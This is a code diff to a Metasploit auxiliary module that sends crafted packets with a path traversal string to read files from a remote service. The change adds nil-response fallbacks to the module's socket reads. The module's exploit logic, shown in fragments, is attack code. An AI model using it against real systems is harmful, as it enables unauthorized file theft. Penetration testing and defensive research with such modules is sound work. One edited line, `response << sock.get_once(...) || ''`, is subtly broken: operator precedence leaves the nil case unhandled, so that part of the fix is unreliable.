@@ -65,7 +65,7 @@ class Metasploit3 < Msf::Auxiliary
     packet << travs # Path traversal
     packet << "\x00"
     sock.put(packet)
-    response = sock.get_once(5, 1)
+    response = sock.get_once(5, 1) || ''
 
     if response.unpack("C").first != 0x78
       print_error "#{ip}:#{rport} - Error opening file"
@@ -84,7 +84,7 @@ class Metasploit3 < Msf::Auxiliary
     packet << stream # stream
     packet << "\x00" * 7
     sock.put(packet)
-    response = sock.get_once(5, 1)
+    response = sock.get_once(5, 1) || ''
 
     if response.unpack("C").first != 0x79
       print_error "#{ip}:#{rport} - Error getting the file length"
@@ -106,7 +106,7 @@ class Metasploit3 < Msf::Auxiliary
       response = ""
 
       while response.length < 0x7ac # Packets of 0x7ac (header (0x9) + block of data (0x7a3))
-        response << sock.get_once(0x7ac-response.length, 5)
+        response << sock.get_once(0x7ac-response.length, 5) || ''
       end
       if response.unpack("C").first != 0x98
         print_error "#{ip}:#{rport} - Error reading the file, anyway we're going to try to finish"
@@ -126,7 +126,7 @@ class Metasploit3 < Msf::Auxiliary
     packet << "\x7B"
     packet << "\x00" * 11
     sock.put(packet)
-    response = sock.get_once(-1, 1)
+    response = sock.get_once(-1, 1) || ''
     if response.unpack("C").first != 0x7B
       print_error "#{ip}:#{rport} - Error closing file file, anyway we're going to try to finish"
     end
